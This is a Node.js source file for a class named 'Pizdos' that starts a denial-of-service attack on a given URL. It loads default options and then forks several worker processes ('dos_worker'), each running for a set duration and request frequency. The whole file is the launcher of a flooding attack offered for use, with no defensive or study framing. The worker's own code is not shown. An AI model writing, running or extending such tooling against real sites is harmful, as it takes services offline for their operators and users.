// ---------------------------- Imports. ---------------------------------
const fs = require('fs'),
      cp = require('child_process')

// --------------------------- Main class. -------------------------------
class Pizdos {
    // Public.
    /**
     * Starts attack on url using options.
     * @param {string} url 
     * @param {Object} options 
     */
    static attack(url, options) {
        fs.readFile(__dirname + '/../config/standart-options.json',
                    'utf8',
                    (err, data) => {
            if (err) throw err
            
            const o = Object.assign(JSON.parse(data), options)

            this.startAttackProcesses(url,
                                      o.processesCount,
                                      o.attackDuration,
                                      o.requestsFrequency)
        })
    }

    // Private.
    /**
     * Starts attack on url.
     * @param {string} url 
     * @param {number} processesCount 
     * @param {number} duration 
     * @param {number} frequency 
     */
    static startAttackProcesses(url, processesCount, duration, frequency) {
        console.log('Attack is started.')
        for (let i = 1; i <= processesCount; i++) {
            cp.fork(__dirname + '/dos_worker', [url, duration, frequency, i])
            console.log(`${i} process is started.`)
        }
    }
}

// ---------------------------- Exports. ---------------------------------
module.exports = Pizdos